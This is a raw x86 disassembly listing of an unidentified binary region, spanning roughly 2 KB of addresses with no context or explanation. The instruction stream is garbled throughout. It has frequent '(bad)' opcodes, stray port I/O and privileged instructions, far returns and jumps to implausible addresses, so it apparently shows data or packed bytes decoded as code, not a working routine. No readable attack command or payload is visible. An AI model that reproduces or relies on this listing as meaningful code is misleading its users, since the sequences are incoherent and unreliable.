  417744:	xor    BYTE PTR [ebx+0x4148333b],ah
  41774a:	(bad)  
  41774b:	cs mov eax,0x276e47b8
  417751:	in     al,dx
  417752:	push   ds
  417753:	push   eax
  417754:	xor    BYTE PTR [esi],dh
  417756:	pop    ebp
  417757:	arpl   WORD PTR [ecx],di
  417759:	dec    esi
  41775a:	and    al,0x8e
  41775c:	xchg   esp,eax
  41775d:	jl     0x4177ac
  41775f:	jp     0x4177c5
  417761:	test   al,0x93
  417763:	int    0x3
  417765:	push   esp
  417766:	xchg   BYTE PTR [ecx+0x56],dl
  417769:	pop    ss
  41776a:	mov    eax,0x4523c16d
  41776f:	add    esp,ebp
  417771:	scas   al,BYTE PTR es:[edi]
  417772:	mov    ecx,0x7b436697
  417777:	push   ebx
  417778:	dec    edx
  417779:	fdivr  st(0),st
  41777b:	test   al,0xc5
  41777d:	cmp    eax,0x7c74b2d7
  417782:	mov    ebp,0xeaacf24
  417787:	(bad)  
  417789:	ins    BYTE PTR es:[edi],dx
  41778a:	sub    DWORD PTR [edi],ecx
  41778c:	push   ebx
  41778d:	out    0x20,eax
  41778f:	mov    edi,0xed7122d5
  417794:	inc    edx
  417795:	js     0x417744
  417797:	scas   eax,DWORD PTR es:[edi]
  417798:	mov    WORD PTR [eax+eax*4],ss
  41779b:	retf   
  41779c:	mov    ebx,0x9267b2f
  4177a1:	push   ecx
  4177a2:	mov    ah,BYTE PTR [edi+0x52450212]
  4177a8:	mov    dh,0x5a
  4177aa:	pop    es
  4177ab:	adc    DWORD PTR [ecx-0x34],0xffffffff
  4177af:	outs   dx,BYTE PTR ds:[esi]
  4177b0:	idiv   esi
  4177b2:	add    bl,0xf7
  4177b5:	cmp    edx,DWORD PTR [eax]
  4177b7:	dec    ebp
  4177b8:	xor    DWORD PTR [esi*4+0x334d9787],esi
  4177bf:	add    eax,DWORD PTR [ebp-0x4c85389a]
  4177c5:	fcomip st,st(1)
  4177c7:	pop    edx
  4177c8:	popf   
  4177c9:	out    dx,eax
  4177ca:	push   edi
  4177cb:	pop    es
  4177cc:	dec    ecx
  4177cd:	or     eax,0x897c490d
  4177d2:	out    dx,eax
  4177d3:	mov    ah,0x2d
  4177d5:	dec    edi
  4177d6:	and    eax,0x9a059c96
  4177db:	mov    bh,0x4
  4177dd:	push   esp
  4177de:	pop    ecx
  4177df:	mov    DWORD PTR [esi-0x15],0xa39dde38
  4177e6:	xlat   BYTE PTR ds:[ebx]
  4177e7:	sti    
  4177e8:	aaa    
  4177e9:	mov    al,ds:0xb6012c80
  4177ee:	dec    ebx
  4177ef:	or     BYTE PTR [eax],cl
  4177f1:	jae    0x417774
  4177f3:	jge    0x417816
  4177f5:	xor    al,0xf0
  4177f7:	enter  0x1d4d,0x2a
  4177fb:	aam    0xcb
  4177fd:	sbb    eax,0xfbdf9cac
  417802:	pusha  
  417803:	push   0x883ac60
  417808:	rol    ecx,cl
  41780a:	(bad)  
  41780b:	sbb    edi,DWORD PTR [esi]
  41780d:	ja     0x417803
  41780f:	sar    BYTE PTR [ecx-0x4510cf67],1
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
